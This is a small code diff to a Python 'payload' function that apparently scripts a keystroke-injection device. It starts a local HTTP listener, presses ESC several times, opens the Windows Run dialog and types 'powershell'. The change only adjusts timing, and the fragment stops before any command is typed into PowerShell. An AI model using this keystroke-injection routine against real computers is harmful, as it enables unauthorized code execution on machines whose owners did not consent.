@@ -76,8 +76,11 @@ def payload(web_dir):
 	httplistener=Process(target=httpd.handle_request)
 	httplistener.start()
 	os.chdir("..")
+	for i in range(4):
+		eco.press("ESC")
+		sleep(0.2)
 	eco.press("WIN+d")
-	sleep(1)
+	sleep(0.5)
 	eco.press("LGUI+r")
 	sleep(1)
 	eco.type("powershell")
